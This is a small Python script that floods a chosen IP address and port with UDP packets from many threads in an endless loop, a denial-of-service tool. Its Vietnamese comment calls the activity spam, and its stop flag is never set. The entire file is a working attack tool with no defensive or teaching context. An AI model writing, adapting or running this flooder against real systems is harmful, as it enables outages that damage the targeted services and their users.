#!/usr/bin/env python3
import sys, socket, threading

IP = sys.argv[1]
PORT = int(sys.argv[2])
NUM_PACKETS = int(sys.argv[3])
PACKET_SIZE = int(sys.argv[4])
NUM_THREADS = int(sys.argv[5])

data = bytearray(PACKET_SIZE)
stop_flag = [False]  # dùng để tắt spam nếu cần

def spam():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_flag[0]:
        for _ in range(NUM_PACKETS):
            try:
                s.sendto(data, (IP, PORT))
            except:
                pass

threads = []
for _ in range(NUM_THREADS):
    t = threading.Thread(target=spam)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
